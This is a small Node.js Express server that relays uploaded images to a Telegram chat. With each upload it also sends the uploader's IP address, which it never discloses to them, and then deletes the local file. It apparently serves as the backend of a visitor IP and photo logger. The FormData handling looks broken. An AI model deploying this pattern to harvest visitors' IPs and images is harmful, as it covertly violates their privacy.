const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const multer = require('multer');
const fs = require('fs');
require('dotenv').config();

const app = express();
const upload = multer({ dest: 'uploads/' });

app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/upload', upload.single('image'), async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const imagePath = req.file.path;

    // Sende IP-Adresse und Bild an Telegram
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramApiUrl = `https://api.telegram.org/bot${botToken}`;

    // Sende IP-Adresse
    await fetch(`${telegramApiUrl}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: `Neue Verbindung:\nIP-Adresse: ${ip}`
        })
    });

    // Sende Bild
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', fs.createReadStream(imagePath));

    await fetch(`${telegramApiUrl}/sendPhoto`, {
        method: 'POST',
        body: formData
    });

    // Bild nach dem Senden löschen
    fs.unlinkSync(imagePath);

    res.sendStatus(200);
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server läuft auf Port ${port}`);
});
